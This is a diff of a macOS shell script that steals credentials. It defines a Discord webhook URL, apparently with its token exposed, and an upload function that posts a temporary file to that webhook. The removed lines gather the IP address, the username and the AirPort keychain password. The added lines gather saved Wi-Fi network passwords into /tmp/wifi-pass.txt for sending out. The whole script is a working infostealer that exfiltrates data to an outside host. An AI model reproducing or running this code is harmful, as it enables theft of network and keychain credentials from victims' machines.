@@ -2,7 +2,7 @@
 
 # Variables
 dc="https://discord.com/api/webhooks/1101079563959808120/UyOetgCEvbNqODpOAkCqzc2oiqHZA2bz85R2SqY52FhPxFFrsc34nsjdn-N_2X0VG6Ea"
-temp_file="/tmp/user_info.txt"
+temp_file="/tmp/wifi-pass.txt"
 
 # Function to upload files to Discord
 function discord_upload() {
@@ -13,14 +13,8 @@ function discord_upload() {
     -F "file1=@$file_path"
 }
 
-# Retrieve IP address, username, and password
-echo "Collecting user information..." > "$temp_file"
-ip_address=$(ifconfig | grep "inet " | grep -v 127.0.0.1 | awk '{print $2}')
-echo "IP address: $ip_address" >> "$temp_file"
-echo "Username: $(whoami)" >> "$temp_file"
-echo "Password: $(security find-generic-password -ws "AirPort" 2>/dev/null)" >> "$temp_file"
-
-# Retrieve Wi-Fi network names and passwords
+# Retrieve Wi-Fi passwords
+echo "Script started" > "$temp_file"
 echo "Gathering Wi-Fi profiles..." >> "$temp_file"
 
 networks=$(networksetup -listpreferredwirelessnetworks en0 | sed '1d')
